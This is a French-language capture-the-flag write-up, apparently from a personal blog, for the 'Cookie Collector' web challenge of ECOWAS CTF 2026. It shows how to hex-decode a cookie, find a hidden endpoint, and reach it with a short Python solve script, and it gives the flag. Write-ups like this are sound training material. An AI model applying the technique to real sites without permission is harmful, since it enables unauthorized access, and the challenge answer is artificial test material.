---
layout: post
title: "ECOWAS CTF 2026 — Cookie Collector [Web/100pts]"
date: 2026-04-24 10:29:00 +0000
categories: [CTF, ECOWAS-CTF-2026]
tags: [web, cookies, hex-encoding, hidden-endpoint, recon, flask]
toc: true
---

> **CTF :** ECOWAS CTF 2026 · **Catégorie :** Web · **Difficulté :** ⭐ (Easy) · **Points :** 100  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**

---

## Description

Live web challenge at `http://labs.ecowasctf.com.gh:5002/`

---

## Reconnaissance

On visite `GET /` et on analyse la réponse HTTP.

**Via curl :**
```bash
curl -i http://labs.ecowasctf.com.gh:5002/
```

**Via le navigateur + DevTools :**
- Ouvrir les **DevTools** (`F12`)
- Onglet **Application** → **Cookies** → `http://labs.ecowasctf.com.gh:5002`
- Le cookie `token` apparaît avec sa valeur hexadécimale

**Via Burp Suite :**
- Activer le proxy Burp, visiter la page
- Dans `HTTP History`, voir la réponse avec le header `Set-Cookie`

```http
HTTP/1.1 200 OK
Set-Cookie: token=54686973206973206120736563726574
```

Le cookie `token` est une chaîne hexadécimale.

```python
bytes.fromhex("54686973206973206120736563726574")
# → b'This is a secret'
```

Dans le HTML de la page, un lien caché :

```html
<a href="/hidden">hidden</a>
```

---

## Exploitation

En visitant `/hidden` sans token → message d'erreur :

```
Hi hacker, the server expects a 'token'
```

En passant le token décodé comme paramètre GET :

```
GET /hidden?token=This is a secret HTTP/1.1
```

Réponse :

```
Well done! Here's your pass: EcowasCTF{c00kie_c0llect0r_m@st3R>!}
```

---

## Script de solve

```python
import requests, binascii

r = requests.get("http://labs.ecowasctf.com.gh:5002/")
hex_token = r.cookies['token']
decoded = binascii.unhexlify(hex_token).decode()   # "This is a secret"

r2 = requests.get(f"http://labs.ecowasctf.com.gh:5002/hidden?token={decoded}")
print(r2.text)  # flag
```

---

## Flag

```
EcowasCTF{c00kie_c0llect0r_m@st3R>!}
```

---

## Vulnérabilité

Le serveur stocke un secret en clair encodé en hex dans un cookie côté client. Il suffit de décoder le cookie et de le renvoyer comme paramètre GET — pas d'authentification serveur réelle.

---

**[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**
